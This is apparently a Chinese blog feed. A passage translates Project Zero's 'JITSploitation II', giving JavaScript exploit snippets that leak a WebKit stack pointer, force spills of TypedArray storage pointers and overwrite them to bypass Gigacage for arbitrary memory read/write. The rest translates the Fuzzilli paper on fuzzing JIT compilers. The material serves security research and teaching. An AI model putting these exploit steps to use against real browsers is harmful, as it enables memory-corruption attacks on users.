在这种情况下，指针将不得不溢出到堆栈。 这可能允许具有损坏堆栈内存能力的攻击者通过在由 <code>GetByVal</code> 或 <code>SetByVal</code> 操作访问内存之前修改堆栈上溢出的指针来突破两个 cage。</p><p>本博客文章的其余部分将描述如何在实践中实现这种攻击。 为此，必须解决三个主要挑战：</p><ul><li>泄漏一个堆栈指针，以便找到并损坏堆栈上溢出的值</li><li>分离 <code>GetIndexedPropertyStorage</code> 和 <code>GetByVal</code> 操作，以便修改溢出指针的代码可以在两者之间执行</li><li>强制将取消 caged 的存储指针溢出到堆栈</li></ul><h4 id="寻找堆栈"><a href="#寻找堆栈" class="headerlink" title="寻找堆栈"></a>寻找堆栈</h4><p>事实证明，在给定任意堆读取&#x2F;写入的情况下，在 JSC 中查找指向堆栈的指针相当容易：VM 对象的 <code>topCallFrame</code> 成员实际上是指向堆栈的指针，因为 JSC 解释器使用本机堆栈，因此顶部的 JS 调用帧也基本上是主线程堆栈的顶部。 因此，找到堆栈就像从全局对象到 VM 实例遵循指针链一样容易：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> <span class="hljs-variable language_">global</span> = <span class="hljs-title class_">Function</span>(<span class="hljs-string">&#x27;return this&#x27;</span>)();<br><span class="hljs-keyword">let</span> js_glob_obj_addr = <span class="hljs-title function_">addrof</span>(<span class="hljs-variable language_">global</span>);<br><br><span class="hljs-keyword">let</span> glob_obj_addr = <span class="hljs-title function_">read64</span>(<span class="hljs-title class_">Add</span>(js_glob_obj_addr, <br>    offsets.<span class="hljs-property">JS_GLOBAL_OBJ_TO_GLOBAL_OBJ</span>));<br><br><span class="hljs-keyword">let</span> vm_addr = <span class="hljs-title function_">read64</span>(<span class="hljs-title class_">Add</span>(glob_obj_addr, offsets.<span class="hljs-property">GLOBAL_OBJ_TO_VM</span>));<br><br><span class="hljs-keyword">let</span> vm_top_call_frame_addr = <span class="hljs-title class_">Add</span>(vm_addr, <br>    offsets.<span class="hljs-property">VM_TO_TOP_CALL_FRAME</span>);<br><span class="hljs-keyword">let</span> vm_top_call_frame_addr_dbl = vm_top_call_frame_addr.<span class="hljs-title function_">asDouble</span>();<br><br><span class="hljs-keyword">let</span> stack_ptr = <span class="hljs-title function_">read64</span>(vm_top_call_frame_addr);<br><span class="hljs-title function_">log</span>(<span class="hljs-string">`[*] Top CallFrame (stack) @ <span class="hljs-subst">$&#123;stack_ptr&#125;</span>`</span>);<br><br></code></pre></td></tr></table></figure><h4 id="分离TypeArray访问操作"><a href="#分离TypeArray访问操作" class="headerlink" title="分离TypeArray访问操作"></a>分离TypeArray访问操作</h4><p>对于上面简单地在索引处访问类型化数组一次（即 a[0]）的 <code>opt</code> 函数，<code>GetIndexedPropertyStorage</code> 操作将直接跟随 <code>GetByVal</code> 操作，因此即使它溢出到堆栈上，也无法破坏 uncaged 的指针。 然而，以下代码已经设法分离了这两个操作：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">opt</span>(<span class="hljs-params">a</span>) &#123;<br>    a[<span class="hljs-number">0</span>];<br><br>    <span class="hljs-comment">// Spill code here</span><br><br>    a[<span class="hljs-number">1</span>];<br>&#125;<br></code></pre></td></tr></table></figure><p>此代码最初将生成以下DFG IR：</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs smali">v0 = GetIndexedPropertyStorage a <br>GetByVal v0, 0<br><br>// Spill code here<br><br>v1 = GetIndexedPropertyStorage a<br>GetByVal v1, 1<br></code></pre></td></tr></table></figure><p>然后，在优化管道中稍后，两个 <code>GetIndexedPropertyStorage</code> 操作将被 CSE（公共子表达式消除）为一个，从而将第二个 <code>GetByVal</code> 与 <code>GetIndexedPropertyStorage</code> 操作分离：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">v0 = GetIndexedPropertyStorage <span class="hljs-keyword">a</span><br>GetByVal v0, <span class="hljs-number">0</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">// Spill code here</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">// Then walk over stack here and replace backing storage pointer</span><br><br>GetByVal v0, <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>但是，只有当溢出代码不修改全局状态时，才会发生这种情况，因为这可能会分离 TypedArray 的缓冲区，从而使其后备存储指针无效。 在这种情况下，编译器将被迫为第二个 <code>GetByVal</code> 重新加载后备存储指针。 因此，不可能运行完全任意的代码来强制溢出，但如下所示，这不是问题。 还值得注意的是，这里必须使用两个不同的索引，否则 <code>GetByVal</code> 也可以进行 CSE。</p><h4 id="溢出寄存器"><a href="#溢出寄存器" class="headerlink" title="溢出寄存器"></a>溢出寄存器</h4><p>完成前两个步骤后，剩下的问题是如何强制溢出由 <code>GetIndexedPropertyStorage</code> 生成的 uncaged 指针。 一种在仍然允许 CSE 发生的同时强制溢出的方法是执行一些简单的数学计算，这些计算需要保持大量的临时值。 以下代码以一种时尚的方式完成了这一点：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> p = <span class="hljs-number">0</span>; <span class="hljs-comment">// Placeholder, needed for the ascii art =)</span><br><br><span class="hljs-keyword">let</span> r0=i,r1=r0,r2=r1+r0,r3=r2+r1,r4=r3+r0,r5=r4+r3,r6=r5+r2,r7=r6+r1,r8=r7+r0;<br><span class="hljs-keyword">let</span> r9=            r8+   r7,r10=r9+r6,r11=r10+r5,   r12   =r11+p      +r4+p+p;<br><span class="hljs-keyword">let</span> r13   =r12+p   +r3,   r14=r13+r2,r15=r14+r1,   r16=   r15+p   +   r0+p+p+p;<br><span class="hljs-keyword">let</span> r17   =r16+p   +r15,   r18=r17+r15,r19=r18+   r14+p   ,r20   =p   +r19+r13;<br><span class="hljs-keyword">let</span> r21   =r19+p   +r12 ,   r22=p+      r21+p+   r11+p,   r23   =p+   r22+r10;<br><span class="hljs-keyword">let</span> r24            =r23+r9   ,r25   =p   +r24   +r8+p+p   +p   ,r26   =r25+r7;<br><span class="hljs-keyword">let</span> r27   =r26+r6,r28=r27+p   +p   +r5+   p,   r29=r28+   p    +r4+   p+p+p+p;<br><span class="hljs-keyword">let</span> r30   =r29+r3,r31=r30+r2      ,r32=p      +r31+r1+p      ,r33=p   +r32+r0;<br><span class="hljs-keyword">let</span> r34=r33+r32,r35=r34+r31,r36=r25+r30,r37=r36+r29,r38=r37+r28,r39=r38+r27+p;<br><br><span class="hljs-keyword">let</span> r = r39; <span class="hljs-comment">// Keep the entire computation alive, or nothing will be spilled.</span><br><br></code></pre></td></tr></table></figure><p>计算的序列在某种程度上类似于斐波那契数列，但需要保持中间结果的活跃，因为它们稍后会在序列中再次用到。 不幸的是，这种方法有些脆弱，因为引擎各个部分（尤其是寄存器分配器）的不相关更改很容易破坏堆栈溢出。</p><p>还有另一种更简单的方法（尽管可能性能稍差且肯定不那么赏心悦目），几乎可以保证原始存储指针将被溢出到堆栈：只需访问与通用寄存器一样多的 TypedArray，而不是只有一个。 在这种情况下，由于没有足够的寄存器来容纳所有原始后备存储指针，因此其中一些必须溢出到堆栈，在那里它们可以被找到并替换。 这种方法的原始版本如下所示：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs js">typed_array1[<span class="hljs-number">0</span>];<br>typed_array2[<span class="hljs-number">0</span>];<br>...;<br>typed_arrayN[<span class="hljs-number">0</span>];<br><br><span class="hljs-comment">// Walk over stack, find and replace spilled backing storage pointer</span><br><span class="hljs-keyword">let</span> stack = ...;   <span class="hljs-comment">// JSArray pointing into stack</span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">512</span>; i++) &#123;<br>    <span class="hljs-keyword">if</span> (stack[i] == old_ptr) &#123;<br>        stack[i] = new_ptr;<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br><br>typed_array1[<span class="hljs-number">0</span>] = val_to_write;<br>typed_array2[<span class="hljs-number">0</span>] = val_to_write;<br>...;<br>typed_arrayN[<span class="hljs-number">0</span>] = val_to_write;<br></code></pre></td></tr></table></figure><p>随着主要挑战的克服，现在可以实现攻击，并且感兴趣的读者可以在本博客文章的末尾找到概念验证。 总而言之，该技术最初实现起来非常繁琐，还有一些需要注意的陷阱 - 详见 PoC。 但是，一旦实现，生成的代码就非常可靠且速度非常快，几乎可以立即在 macOS 和 iOS 以及不同的 WebKit 版本上实现真正任意的内存读取&#x2F;写入原语，而无需额外更改。</p><h3 id="结论-1"><a href="#结论-1" class="headerlink" title="结论"></a>结论</h3><p>这篇文章展示了攻击者如何（仍然）利用众所周知的 <code>addrof</code> 和 <code>fakeobj</code> 原语来获得 WebKit 中的任意内存读取&#x2F;写入。 为此，必须绕过 StructureID 缓解措施，而绕过 Gigacage 主要是可选的（但很有趣）。 从编写此漏洞利用程序到目前为止，我个人得出以下结论：</p><ul><li>StructureID 随机化目前似乎非常薄弱。 由于大量的类型信息存储在 JSCell 位中，因此攻击者可以预测这些信息，因此似乎可以找到并滥用许多其他不需要有效 StructureID 的操作。 此外，可以转化为堆越界读取的错误很可能用于泄漏有效的 StructureID。</li><li>就目前而言，Gigacage 作为安全缓解措施的目的对我来说并不完全清楚，因为可以从不受 Gigacage 约束的普通 JSArray 构建（几乎）任意的读取&#x2F;写入原语。 在这一点上，正如这里所演示的，Gigacage 也可以被完全绕过，即使这在实践中可能不是必需的。</li><li>我认为值得调查删除未装箱的双精度 JSArray 以及正确 caging 其余 JSArray 类型（它们都存储“已装箱”的 JSValue）的影响（包括对安全性和性能的影响）。 这可能会使 StructureID 随机化和 Gigacage 都变得更强大。 在此漏洞利用的情况下，这将首先阻止 <code>addrof</code> 和 <code>fakeobj</code> 原语的构造（因为双精度 &lt;-&gt; JSValue 类型混淆将不再能够构造），以及通过 JSArray 进行的有限读取&#x2F;写入，并且还将阻止通过 OOB 访问到 JSArray 中泄漏有效的 StructureID（可以说是 OOB 访问最常见的场景）。</li></ul><p>本系列的最后一部分将展示如何在存在 PAC 和 APRR 等更多缓解措施的情况下，从读取&#x2F;写入中获得 PC 控制。</p><p>翻译自（+了些个人理解）：<a href="https://googleprojectzero.blogspot.com/2020/09/jitsploitation-two.html">JITSpoitation II</a></p><h2 id="JITSploitation-III-Subverting-Control-Flow"><a href="#JITSploitation-III-Subverting-Control-Flow" class="headerlink" title="JITSploitation III: Subverting Control Flow"></a>JITSploitation III: Subverting Control Flow</h2><p>TODO….</p>]]></content>
    
    
    <categories>
      
      <category>CVE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CVE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Fuzzilli：论文阅读</title>
    <link href="/2025/03/05/Fuzzilli%EF%BC%9A%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/"/>
    <url>/2025/03/05/Fuzzilli%EF%BC%9A%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/</url>
    
    <content type="html"><![CDATA[<h1 id="FUZILLI-Fuzzing-for-javaScript-JIT-Compiler-Vulnerabilities"><a href="#FUZILLI-Fuzzing-for-javaScript-JIT-Compiler-Vulnerabilities" class="headerlink" title="FUZILLI: Fuzzing for javaScript JIT Compiler Vulnerabilities"></a>FUZILLI: Fuzzing for javaScript JIT Compiler Vulnerabilities</h1><h2 id="全文翻译"><a href="#全文翻译" class="headerlink" title="全文翻译"></a>全文翻译</h2><h3 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h3><p>JavaScript 已经成为互联网基础设施不可或缺的一部分，并且如果没有这种编程语言，当今的交互式Web应用程序将是无法想象的。但不利的一面是，这种交互性意味着Web应用程序依赖于越来越多的计算密集型JavaScript代码，这给负责高效执行代码的JavaScript引擎带来了负担。为了满足这些日益增长的性能需求，现代JavaScript引擎都配备了复杂的<strong>即时编译器（JIT）</strong>。然而，JIT编译器是一项复杂的技术，因此为潜在的漏洞（甚至可能是致命的漏洞）提供了广泛的攻击面。在JavaScript引擎中发现软件漏洞的已有工作中，大部分是模糊测试。不幸的是，这些模糊测试策略并不是为生成实际触发JIT语义的源代码而设计的。因此，JIT漏洞不太可能被现有策略发现。在本文中，我们填补了这一空白，并提出了第一个Fuzzer，重点是JIT漏洞。更具体地说，我们提出了一个中间表示（IR）的设计和实现，重点是发现JIT编译器的漏洞。我们实现了所提出方法的完整原型，并在六个月的时间内对我们的Fuzzer进行了评估。我们总共发现了17个已确认的安全漏洞。我们的结果表明，有针对性的<strong>JIT Fuzzing</strong>是可能的，并且在JavaScript引擎的Fuzzing覆盖率中存在一个被忽视的危险问题。</p><h3 id="1-介绍"><a href="#1-介绍" class="headerlink" title="1. 介绍"></a>1. 介绍</h3><p>如果没有JavaScirpt（JS），现代Web是不可想象的。在AngularJS、React或JQuery等强大的JavaScript框架的推动下，现代Web内容通常完全在客户端创建，而不是以HTML的形式交付。这种演变给现有仅依赖解释JS代码的JS引擎带来了越来越多的性能问题。因此，为了实现动态的Web体验，现代Web浏览器积极转向JS代码的即时即使编译（JIT）和优化。虽然JIT引擎提供了令人满意的性能改进，但它们使JS代码的执行变得更加复杂，并且本质上暴露了一个很大的攻击面。基于JIT编译器缺陷的软件漏洞对攻击者很有吸引力，因为它们提供了强大的利用原语，并且通常允许基于单个漏洞的代码执行。攻击者可以将一次成功的攻击与浏览器**沙箱逃逸（sandbox）**链接起来，通过引诱受害者访问恶意网站来获得未经授权的权限。</p><p>JavaScript作为一种编程语言，其本质上是灵活和动态的。由于这种灵活性，JIT优化需要对引擎的全局状态、相关对象组，甚至参与优化代码段的单个对象做出假设。这些假设必须被证明为真，或者收到复杂的运行时机制的保护，这些机制在先前做出的假设被违反时通知引擎。任何被证明为假但在执行期间仍然未被检测到的假设都代表着一个重大漏洞，例如CVE-2018-4233，这是WebKit的JIT编译器中的一个错误。因此，JIT编译错误应该是软件测试的重点。一种在JavaScript引擎等复杂软件系统中查找错误的流行方法是模糊测试（简称Fuzzing）。模糊测试涉及使用许多不同的输入来测试软件，并评估软件如何响应这些输入。其根本目的是在软件中找到导致重要崩溃的边缘情况。然后，分析人员可以进一步调查这些崩溃，以创建一个概念验证，用于利用可能突破JavaScript 沙箱的漏洞。过去，模糊测试主要用于查找JavaScript引擎中的漏洞，并且已经发现了JavaScript引擎的一些关键问题。然而，以前的模糊测试方法针对JavaScript引擎，而没有侧重于特定组件，或者仅侧重于运行时API。这种方法可以发现范围广泛的漏洞，但很少发现需要多个前提条件同时满足的更复杂漏洞。特别是，JIT编译漏洞正是这种类型的漏洞。</p><p>为了使得<strong>JIT优化</strong> 出现，必须满足某些条件：引擎必须频繁执行有问题的代码，并且代码在观察期间必须表现出可预测的行为，因为只有这样JIT编译才会启动。这些条件意味着，不仅必须以一种特殊的方式构造JS代码以突出显示缺陷，而且还必须以类似的方式多次执行它，然后以不可预测的方式更改其行为，以便JS引擎遇到错误。对于通过突变或多或少随机生成代码片段的Fuzzer来说，这种行为很难重现。传统的JS fuzzer生成JS构造并将每个语句包装在try-catch块中，因为它们无法保证语义正确性。**遗憾的是，JIT 编译器对待包装在try-catch中的代码与未包装的代码不同，因此许多JIT 错误都无法通过这些方法检测到。**其他工作从现有的JS语料库生成测试用例。依赖于预先存在的语料库需要足够多样化的特定漏洞集合，才能推断出类似的漏洞。这种要求限制了发现与现有测试用例不同的漏洞的能力。**总之，开发一种有针对性的模糊测试方法来检测JIT编译中的新缺陷是一项尚未解决的挑战。**在本文中，我们弥补了模糊测试覆盖范围中的这一研究空白，并提出了第一个使用中间表示（IR）的模糊器，该中间表示专注于发现JavaScript引擎中的JIT漏洞。我们的IR允许我们生成没有初始输入语料库的新JavaScript程序，从而针对JIT编译器。此外，我们的IR允许实现语义上有意义的突变操作，例如拼接多个输入程序，同时重新连接指令操作数，这是基于AST的常见模糊测试方法中缺少的功能。</p><p>我们实施了所提出的方法，并对我们的原型在主要的JS引擎Apple JavaScriptCore、Google V8和Mozilla SpiderMonkey上进行了全面的评估。我们发现，在所有的引擎上，我们的Fuzzer都与最先进的开源模糊器Superion相比毫不逊色。此外，我们发现，当提供一个全面的输入语料库时，Superion无法实现显著的代码覆盖率提升。相比之下，我们的方法在不同的设置中表现良好，并且我们发现了17个严重（Critical）漏洞。</p><p>总之，我们的主要贡献是：</p><ul><li>我们提出了基于IR的模糊测试方法的设计和实现，该方法对现代Web浏览器JS引擎中的JIT漏洞。</li><li>在一个全面的评估中，我们通过我们的原型实现发现了17个安全关键型漏洞。对已识别漏洞的更详细分析证实，大多数缺陷确实与JIT编译器有关。</li><li>我们对现代浏览器Fuzzer进行了全面的比较，发现我们的方法优于称为Superion的最先进方法。</li></ul><h3 id="2-背景和相关工作"><a href="#2-背景和相关工作" class="headerlink" title="2. 背景和相关工作"></a>2. 背景和相关工作</h3><p>模糊测试是一个受欢迎的研究领域，在过去几年中收到了广泛关注。在下文中，我们将简要介绍该领域，并讨论与我们工作密切相关的工作。鉴于该领域的范围非常广泛，我们无法提供所有相关工作的全面概述，因此主要关注改进JavaScript模糊测试的相关工作。有关模糊测试领域的介绍和概述，我们请读者参考关于<a href="https://koasas.kaist.ac.kr/bitstream/10203/289589/1/111726.pdf">模糊测试</a>和<a href="https://szu-se.github.io/FuzzingPaper/Paper/Arxiv20_SoK.pdf">灰盒模糊测试</a>的综述。有关最近模糊测试出版物的完整列表，我们请读者参考维护该领域已发表论文列表的在线存储库。</p><h4 id="A-模糊测试概述"><a href="#A-模糊测试概述" class="headerlink" title="A. 模糊测试概述"></a>A. 模糊测试概述</h4><p>模糊测试可以在高层次上划分为几种不同的方法，我们将在下面简要解释。这些通用方法提供了一个粗略的分类，在实践中，使用了许多混合方法，因此并不总是能够进行清晰的区分。</p><p><strong>a）生成式模糊测试：</strong> 基于生成的方法使用生成器函数从头开始生成每个输入，这些生成器函数输出相关数据。生成方法的主要优点是，生成的输入在设计上是语法正确的，因为生成器函数尊重被测程序所期望的基础语法。</p><p><strong>b）基于变异的模糊测试：</strong> 基于变异的方法使用种子文件，并根据某些规则对其进行操作，然后继续将略微修改的文件作为新的种子文件。突变可以是随机和任意的，例如位&#x2F;字节翻转或消息部分的随机添加&#x2F;删除，或者更有针对性，例如用已知过去存在问题的数据点（例如，MAX INT或MIN INIT等魔术值）替换整数或字符串。</p><p><strong>c）引导式模糊测试：</strong> 引导式模糊测试扩展了基于变异的模糊测试中使用的方法，并根据某些指标（例如，覆盖率引导的模糊测试）基于相关性来修剪突变的文件。在langue fuzzing（用编程语言实现的程序）中，用于修剪的一个流行指标是分支覆盖率。使用分支覆盖率的fuzzer收集关于执行目标程序的分支的数据，并且如果它们在执行期间没有发现任何新的分支，则删除&#x2F;忽略新的突变文件以供进一步考虑。这种方法确保了模糊测试过程保持一定的势头，并且不会陷入僵局。</p><h4 id="B-JavaScript模糊测试"><a href="#B-JavaScript模糊测试" class="headerlink" title="B. JavaScript模糊测试"></a>B. JavaScript模糊测试</h4><p>之前的几篇出版物涵盖了JavaScript浏览器引擎或独立的JavaScript引擎的一般模糊测试，但到目前为止，还没有任何出版物专注于JIT编译器中的漏洞。因此，在Javascript模糊器覆盖范围中存在一个空白，我们用我们的方法来填补。请注意，以前的JavaScript模糊测试工作涉及使用中间表示来进行JavaScript fuzzing或语义上正确的JavaScript模糊测试，这两种属性我们的fuzzer为了在fuzzing JIT编译器漏洞中取得成功而具备（并且需要）。因此，我们在下面讨论我们的方法如何与该领域以前的工作相关。</p><p>Holler 等人提出了该主题的早期工作之一，它们建议使用抽象语法树（AST）作为中间表示。在fuzzing期间，AST的子节点被获取并替换为来自其他程序的节点（甚至新生成的代码），然后转换回实际的fuzz语言。请注意，此过程生成符合fuzz语言语法的代码。然而，没有关注任何特定的错误类别或生成代码的语义有效性。在我们的工作中，我们不使用AST作为中间表示。相反，我们开发了自己的中间语言，该语言代表JavaScript的一个子集。最重要的是，它能够专注于JIT错误和生成代码的语义有效性。</p><p>最近，He等人提出了SoFi，一种语义感知的fuzzing策略。为了确保生成测试用例的有效性，作者建议使用细粒度的程序分析来识别变量，并推导出这些变量的类型以进行突变。此外，SoFi使用自动修复策略来修复无效测试用例中的语法和语义错误。遗憾的是，SoFi的完整源码没有公开提供，因此我们无法直接将我们的方法与Sofi进行比较。此外，我们保留对SoFi发现的错误是否确实具有critical级别的疑问。</p><p>Saxena等人开发了一种中间语言，用于将不同的JavaScript指令（例如，拆分字符串）规范化为单个动作，以改进模糊测试。通过这种方式，实现的细微细节被抽象成更高级别、更易于处理的表示。他们的重点是检测JavaScript应用程序中的客户端验证漏洞，而不是浏览器本身的JavaScript引擎。因此，他们的模糊测试是基于JavaScript程序的输入，而不是JavaScript引擎的输入（即，JavaScript代码）本身。</p><p>本着类似的精神，Hodov’an等人创建了JavaScript 引擎API的基于图的表示，并使用该图来生成用于模糊测试的输入数据。然而，他们专注于JavaScript引擎提供的API，并且不生成超出它的代码。因此，生成的代码侧重于语义正确性，但不太可能检测到JIT编译器错误。</p><p>Lee等人提出了Montage，一种基于神经网络语言模型（NNLM）的fuzzer。他们将AST转换为可以直接用于训练NNLM的AST子树。使用Montage，作者发现37个漏洞，包括3个CVE。尽管他们发现了一个与JIT相关的漏洞，但总体方法与我们的方法是正交的，因为他们在AST上使用机器学习。相比之下，我们在IR上使用预定义的突变。此外，他们不以JIT为目标，而是对JavaScript引擎进行广泛的模糊测试。</p><p>最近，Ta Dinh等人提出了Favocado，一种专门用于模糊测试JavaScript代码中绑定层的fuzzer。他们报告说，模糊测试此类绑定需要句法和语法上的正确性，才能达到预期的测试区域。这种方法与我们在fuzzing JIT相关代码部分时面临的挑战类似，这些代码部分也需要高度的语义和句法正确性。然而，Javascript引擎的目标方面与我们的方法不可比，因为我们专注于JIT编译器中的软件缺陷。</p><p>为了提高fuzz输入的语义正确性，Dewey等人研究了如何在该领域中使用约束逻辑编程（CLP）。作者使用CLP来生成语义上有效的代码，这与我们的重点类似，但他们并不关注JIT编译器漏洞，因为这类软件缺陷尤其难以处理。</p><p>Wang等人提出了Skyfire，一种用于模糊测试的种子生成工具，它需要一个输入语料库和一个语法。基于此输入，Skyfire学习概率上下文相关语法，并使用此语法生成种子输入。作者表明，他们的方法对于结构化程度很高的语言（例如XML）效果很好。然而，他们只提供了关于JavaScript模糊测试的初步结果，将未来的工作留给扩展他们的方法“以更好地支持更复杂的语言，例如JavaScript和SQL”。</p><p>Han等人提出了CodeAlchemist，一种用于JavaScript的生成式fuzzer。</p><p>Park等人提出了一种新颖的方法DIE，用于利用输入语料库中的隐藏信息，他们称之为aspects。这种方法使fuzzer能够生成更复杂，因此也更深刻的测试程序。他们分析给定的输入种子文件，不仅提取代码片段，还提取代码片段的aspects，例如结构和运行时类型。然后，所提出的fuzzing方法使用此信息来生成包含提取方面的新代码片段。尽管该工作具有类似于我们的类型系统，但类型信息应用于AST层而不是IR。</p><p>一般来说，AST能够表示任何有效的JavaScript程序，但这个抽象层面对于突变来说并不理想。类似于现代编译器使用的代码转换，我们将突变应用于IR层。这种设计决策使得能够实现语义上有意义的突变，从而产生高度多样化的生成的JavaScript程序，这是fuzzing的关键方面。</p><p>在一个正交的方法中，Aschermann等人提出了Nautilus，一种将输入语法于代码覆盖率相结合的多语言fuzzer。突变应用于AST层，因此收到上述限制。最近一项关于多语言fuzzing的工作称为Polyglot，它通过将种子语料库翻译成与语言无关的IR来改进 Nautilus。 遗憾的是，适用于 IR 的突变非常有限，例如，甚至像变量定义这样的基本语言特性也不容易进行突变。 相比之下，我们的专业化使我们能够包含高度专业化的突变器和生成器，这些突变器和生成器专门针对代码以触发 JIT 例程。因此，我们在主要Web浏览器中使用的真实JIT引擎中发现了明显更多的Critical软件漏洞。</p><p>关于没有特别关注模糊测试的Javascript相关安全研究，我们参考两篇最新的调查论文。</p><h3 id="3-JIT-编译器漏洞"><a href="#3-JIT-编译器漏洞" class="headerlink" title="3. JIT 编译器漏洞"></a>3. JIT 编译器漏洞</h3><p>在本节中，我们首先简要概述现代浏览器中用于JavaScript的JIT编译，然后通过一个JIT漏洞的案例研究来说明技术挑战。</p><h4 id="A-JIT"><a href="#A-JIT" class="headerlink" title="A. JIT"></a>A. JIT</h4><p>我们使用一个小的、直观的例子来简要介绍当前设计和实现高效JS JIT编译器的方法。更具体地说，我们解释了混合模式JIT 编译器架构的基本概念，即以解释器作为基线，然后是一系列连续更高优化的JIT编译器。有关不同JIT编译方法的更详细和全面的解释，包括基于模板和基于跟踪的JIT编译，我们请读者参考常见的编译器和解释器文献。</p><p>浏览器中使用的JavaScript引擎包含解析器、字节码编译器、解释器，通常还包含JIT编译器。首次遇到JavaScript代码时，引擎的解析器会构建相应的AST，该AST由字节码编译器编译为引擎特定的字节码。该字节码由解释器使用。然而，字节码解释速度很慢，这是由于调度开销以及每个字节码处理程序执行的众多（通常是冗余的）类型检查。如果代码被频繁执行，则最好通过将JavaScript代码编译为机器代码并在编译过程中对其进行优化来优化执行。</p><p>与经典的提前编译编译器（例如，clang）相比，JavaScript JIT 编译器面临的挑战的一个直观示例可以在<strong>图1</strong>中看到：给定的C代码可以直接编译成汇编代码，因为所有需要的信息都存在。与C相反，JavaScript是动态类型的，并非所有生成机器代码所需的信息都存在。因此，如果需要性能，JIT编译器不能简单地将JavaScript代码编译成机器代码。执行必须首先确认使用的类型，然后根据手头的类型进行处理。这些类型可以从原始整数到高度复杂的对象，当与相同功能一起使用时，所有这些类型都表现出不同的行为。</p><img src="/2025/03/05/Fuzzilli：论文阅读/image-20250305221800781.png"  alt="image-20250305221800781" style="zoom:80%;" /><p>然而，在执行期间，使用模式变得明显。例如，让我们假设观察到<code>add</code>操作只被用作整数调用。基于这种观察，可以执行推测性优化：编译器专门为推断出的类型配置文件编译JavaScript代码。最后，添加类型保护，表示优化类型假设。保护措施会检查给定的值是否属于假设的类型（在我们的示例中为整数）。只要保护措施有效，代码就会继续使用现在已优化的函数。如果保护失败，代码将”退出“，并且JavaScript代码的执行将返回到解释器，该解释器执行未优化的、速度较慢的函数。生成的抽象汇编代码将类似于编译后的C代码，但区别在于包含类型保护，并且，由于我们谈论的是整数加法，所以还包含溢出检查。我们可以将此类优化总结为以下步骤，从而生成正在审查的函数的已编译和优化版本：（1）收集使用模式数据，（2）推断类型模式，（3）针对这些类型优化代码，（4）在优化代码之前部署类型保护。</p><p>引擎不立即使用JIT编译网页的JavaScript代码的原因有两个：首先，分析器必须收集执行信息才能使JIT优化起作用。其次，JIT优化非常耗时，因为优化给定JavaScript程序的各个方面可能消耗的时间比通过执行速度增益节省的时间还要多。</p><p>为了在触发JIT编译之前收集所需的信息，分析器（引擎的一部分）收集已执行代码的执行信息。达到内部指定的阈值后，引擎会安排代码进行JIT编译。以后的执行直接调用优化后的代码，而不是通过字节码解释来执行函数。因此，典型的现代JIT编译器管道包括<strong>图2</strong>中可视化的步骤。</p><img src="/2025/03/05/Fuzzilli%EF%BC%9A%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/image-20250305223826487.png" class="" title="image-20250305223826487"><p>(a) 引擎将源代码转换为AST。</p><p>(b) 引擎将AST编译为自定义VM的字节码</p><p>(c) 引擎将字节码传递给JIT编译器，JIT编译器将其转换为编译器特定的IR。字节码旨在由解释器执行，而JIT IR旨在促进各种程序优化的实现。</p><p>(d) JIT编译器优化IR并添加类型保护，这实际上是将类型信息添加到IR。</p><p>(e) 最后，JIT编译器将IR降低为机器代码，该代码直接在主机CPU上执行。</p><h4 id="B-JIT漏洞案例研究"><a href="#B-JIT漏洞案例研究" class="headerlink" title="B. JIT漏洞案例研究"></a>B. JIT漏洞案例研究</h4><p><code>CVE-2018-4233</code>是我们在初步探索JIT编译器漏洞期间发现的首批漏洞之一。JIT编译器尝试合并多个类型保护，但未能识别出被检查变量的类型可能会在两者之间发生变化。</p><ol><li><p><strong>保护冗余消除：</strong> 